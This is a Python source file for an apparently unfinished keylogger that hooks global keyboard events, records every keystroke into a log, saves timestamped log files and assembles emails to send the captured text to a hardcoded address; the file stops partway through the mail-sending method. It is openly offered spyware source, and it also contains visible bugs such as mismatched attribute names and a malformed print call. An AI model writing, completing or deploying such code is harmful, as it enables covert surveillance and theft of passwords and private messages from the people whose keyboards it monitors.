import keyboard
import smtplib

from threading import Event, Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


SEND_REPORT_EVERY = 60
EMAIL_ADDRESS = "keylogdump@yopmail.com"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        #record start & end datetimes
        self.start_ft = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This is used whenever a keyboard event occurs
        """
        name = event.name
        if len(name) > 1:
            #not a character, special key, uppercase wiht[]
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":","")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":","")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file-f)
        print(f"[+] Saved {self.filename}.txt")
    
    def prepare_mail(self, message):
        msg = MIMEMultipart("alternative")
        msg["From"] = EMAIL_ADDRESS
        msg["To"] = EMAIL_ADDRESS
        msg["Subject"] = "Keylogger logs"
        html = f"<p>{message}</p>"
        text_part = MIMEText(message, "plain")
        html_part = MIMEText(html, "html")
        msg.attach(text_part)
        msg.attach(html_part)
        return msg.as_string()
    
    def sendmail(self, email, message, verbose=1):
        server = smtplib.SMTP()

